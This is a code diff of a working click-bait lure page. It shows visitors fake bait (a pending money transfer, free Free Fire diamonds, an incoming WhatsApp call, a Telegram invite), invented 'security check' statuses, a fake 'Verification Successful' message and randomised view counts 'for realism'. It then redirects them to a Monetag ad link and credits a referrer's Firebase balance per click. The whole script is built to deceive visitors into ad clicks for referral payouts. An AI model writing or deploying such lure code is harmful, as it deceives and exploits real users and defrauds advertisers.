+                color: "5, 150, 105"
+            },
+            // 💰 MONEY
+            money: {
+                img: "https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?q=80&w=1000",
+                title: "Pending Transaction: ৳500.00",
+                desc: "Transfer paused due to security check. Verify to resume.",
+                icon: "wallet",
+                color: "226, 19, 110"
+            },
+            // 🎮 GAMING
+            freefire: {
+                img: "https://wallpapers.com/images/hd/garena-free-fire-4k-gaming-poster-c7g4q0y0y0y0y0y0.jpg",
+                title: "5000 Diamonds Bundle",
+                desc: "UID 28**91 Selected. Verify ownership to claim.",
+                icon: "gem",
+                color: "234, 179, 8"
+            },
+            // 💬 WHATSAPP
+            whatsapp: {
+                img: "https://images.unsplash.com/photo-1577563908411-5077b6dc7624?q=80&w=1000",
+                title: "Incoming Video Call...",
+                desc: "End-to-end encrypted connection. Verify to answer.",
+                icon: "video",
+                color: "34, 197, 94"
+            },
+            // ✈️ TELEGRAM
+            telegram: {
+                img: "https://images.unsplash.com/photo-1614680376593-902f74cf0d41?q=80&w=1000",
+                title: "Join Private Channel",
+                desc: "This link expires in 5 minutes. Verify to join.",
+                icon: "paper-plane",
+                color: "56, 189, 248"
+            },
+            // DEFAULT
+            default: {
+                img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000",
+                title: "Security Checkpoint",
+                desc: "Please verify you are human to access the destination.",
+                icon: "shield-alt",
+                color: "59, 130, 246"
+            }
         };
 
         // ==========================================
-        // 🕹️ CORE FUNCTIONS
+        // 🚀 RENDER & INTERACTION LOGIC
         // ==========================================
-        
-        // 1. Render Theme
-        function renderPage() {
+
+        function renderTheme() {
             const t = themes[type] || themes['default'];
-            document.getElementById('theme-content').innerHTML = t.render();
             
-            // Adjust body bg if needed
-            if(type === 'job' || type === 'giftcard' || type === 'health' || type === 'result' || type === 'drive') {
-                document.getElementById('main-body').classList.remove('bg-gray-900', 'text-white');
-            }
+            // Set Visuals
+            const imgEl = document.getElementById('theme-image');
+            imgEl.src = t.img;
+            
+            // Set Texts
+            document.getElementById('theme-title').innerText = t.title;
+            document.getElementById('theme-desc').innerText = t.desc;
+            
+            // Set Button Color
+            const btn = document.getElementById('cta-btn');
+            btn.className = `w-full bg-gradient-to-r from-[rgb(${t.color})] to-gray-700 text-white font-bold py-4 rounded-xl shadow-lg transition-all transform active:scale-95 flex items-center justify-center gap-3 relative overflow-hidden group`;
+            
+            // Randomize View Count for realism
+            document.getElementById('view-count').innerText = (Math.random() * (5.5 - 1.2) + 1.2).toFixed(1) + 'K';
+            
+            // Icon
+            const iconHtml = `<i class="fas fa-${t.icon}"></i>`;
+            document.getElementById('center-icon').innerHTML = iconHtml;
         }
 
-        // 2. Lock Trigger
-        window.triggerLock = function(themeKey) {
-            const t = themes[themeKey] || themes['default'];
-            const modal = document.getElementById('verify-modal');
-            const btn = document.getElementById('final-btn');
-            const bar = document.getElementById('modal-progress');
-            const icon = document.getElementById('modal-icon');
-            
-            modal.classList.remove('hidden');
-            
-            // Theme Colors
-            const color = t.modalColor || "59, 130, 246";
-            icon.style.color = `rgb(${color})`;
-            icon.style.backgroundColor = `rgba(${color}, 0.1)`;
-            btn.style.backgroundColor = `rgb(${color})`;
-            bar.style.backgroundColor = `rgb(${color})`;
+        // 🕹️ SMART INTERACTION HANDLER (The Retention Hook)
+        window.handleUserInteraction = async function() {
+            const btn = document.getElementById('cta-btn');
+            const btnText = document.getElementById('btn-text');
+            const loader = document.getElementById('loader-overlay');
+            const loaderText = document.getElementById('loader-text');
+            const visual = document.getElementById('visual-area');
 
-            // Progress Animation
-            let width = 0;
-            bar.style.width = '0%';
-            btn.disabled = true;
-            btn.innerHTML = `<i class="fas fa-lock"></i> Verifying...`;
-            
-            const interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    btn.disabled = false;
-                    btn.style.opacity = "1";
-                    btn.style.cursor = "pointer";
-                    btn.classList.add('pulse-fast');
-                    btn.innerHTML = `CONTINUE ➤`;
-                    btn.onclick = verifyAndRedirect;
-                } else {
-                    width += 4; // Faster load
-                    bar.style.width = width + '%';
-                }
-            }, 80);
-        };
-
-        window.closeModal = function() {
-            document.getElementById('verify-modal').classList.add('hidden');
-        };
-
-        // 3. Final Redirect Logic
-        async function verifyAndRedirect() {
-            const btn = document.getElementById('final-btn');
-            btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
-            
-            if (isSafeUser && refCode) {
-                 try {
-                    const q = query(collection(db, "users"), where("referralCode", "==", refCode));
-                    const snap = await getDocs(q);
-                    if(!snap.empty) {
-                        const uid = snap.docs[0].id;
-                        await setDoc(doc(db, "users", uid), {
-                            balance: increment(0.50), 
-                            todayImpression: increment(1), 
-                            totalEarnings: increment(0.50), 
-                            lastClickTime: serverTimestamp()
-                        }, { merge: true });
-                        localStorage.setItem('ns_secure_lock', Date.now());
-                    }
-                } catch (e) { console.error("DB Error", e); }
+            // STEP 1: First Click - Simulation
+            if (interactionStep === 0) {
+                interactionStep = 1;
                 
-                // Redirect to Ad Link
-                window.location.href = CONFIG.MONETAG_LINK;
-            } else {
-                window.location.replace(CONFIG.SAFE_PAGE);
-            }
-        }
+                // Show Loader
+                loader.classList.remove('hidden');
+                
+                // Sequence of Fake Statuses
+                const statuses = [
+                    "Checking Device...",
+                    "Establishing Secure Line...",
+                    "Optimizing Stream...",
+                    "Almost Ready..."
+                ];
 
-        // Run
-        renderPage();
+                let i = 0;
+                const statusInterval = setInterval(() => {
+                    loaderText.innerText = statuses[i];
+                    i++;
+                    if (i >= statuses.length) clearInterval(statusInterval);
+                }, 800);
+
+                // Wait 3 Seconds (Retention)
+                setTimeout(() => {
+                    loader.classList.add('hidden');
+                    
+                    // Change UI for Step 2
+                    btnText.innerText = "CONTINUE TO CONTENT ➤";
+                    document.getElementById('theme-desc').innerHTML = "<span class='text-green-400 font-bold'>✔ Verification Successful.</span> Click to proceed.";
+                    document.getElementById('theme-desc').classList.add('animate-pulse');
+                    
+                    // Slightly reveal image (Psychological reward)
+                    document.getElementById('theme-image').style.filter = "blur(8px)";
+                    
+                    interactionStep = 2; // Ready for Ad
+                }, 3500);
+            }
+            
+            // STEP 2: Final Click - Ad Trigger
+            else if (interactionStep === 2) {
+                if (!isAdAvailable) {
+                    // Capped? Send to Safe Page
+                    window.location.href = CONFIG.SAFE_PAGE;
+                    return;
+                }
+
+                // Show processing one last time
+                btnText.innerText = "Redirecting...";
+                btn.disabled = true;
+                
+                // Log Firebase (If ref code exists)
+                if (refCode) {
+                    try {
+                        const q = query(collection(db, "users"), where("referralCode", "==", refCode));
+                        const snap = await getDocs(q);
+                        if(!snap.empty) {
+                            const uid = snap.docs[0].id;
+                            await setDoc(doc(db, "users", uid), {
+                                balance: increment(0.50), 
+                                todayImpression: increment(1),
+                                lastClickTime: serverTimestamp()
+                            }, { merge: true });
+                        }
+                    } catch(e) {}
+                }
+
+                // Set Frequency Cap LocalStorage
+                localStorage.setItem('ns_last_click', Date.now());
+
+                // GO!
+                window.location.href = CONFIG.MONETAG_LINK;
+            }
+        };
+
+        // Initialize
+        renderTheme();
 
     </script>
 </body>
